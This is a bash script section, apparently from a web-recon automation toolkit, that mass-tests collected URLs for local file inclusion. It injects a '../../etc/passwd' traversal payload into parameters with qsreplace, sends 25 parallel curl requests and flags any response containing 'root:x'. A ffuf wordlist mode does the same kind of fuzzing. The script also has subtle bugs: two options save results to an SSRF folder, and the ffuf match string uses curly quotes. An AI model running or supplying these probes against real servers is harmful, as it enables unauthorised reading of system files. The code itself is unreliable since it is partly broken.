#LFI-------------------------------------------------------------------------------------





echo	"1. qsreplace_LFI (urls.txt parameters_paramspider.txt)   2. qsreplace_LFI (.txt)  3. wordlist_LFI () "	

mkdir results/lfi	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the payload (../../etc/passwd) : "
	  			read payload
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | sort -u | gf lfi | qsreplace "$payload" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee lfi.txt
 
                                #move file
                                mv lfi.txt results/lfi

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
				read file
                                echo -n "Enter the payload (../../etc/passwd) : "
				read payload
				#Exploit
				cat $file | sort -u | gf lfi | qsreplace "$payload" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee lfi_random-file.txt
 
                                #move file
                                mv lfi_random-file.txt results/ssrf
		;;
          
	3)
				echo -n "Enter the path of wordlist (~/wordlist/#path) : "
                                read path
        
				#Exploit
             	                cat urls.txt parameters_paramspider.txt | sort -u | gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/$path ; done | tee lfi_wordlist.txt

                                #move file
                                mv lfi_wordlist.txt results/ssrf
		;;
	
	
                *)
                        echo "Please give valid choice!!!"
		;;

esac










#LFI-------------------------------------------------------------------------------------
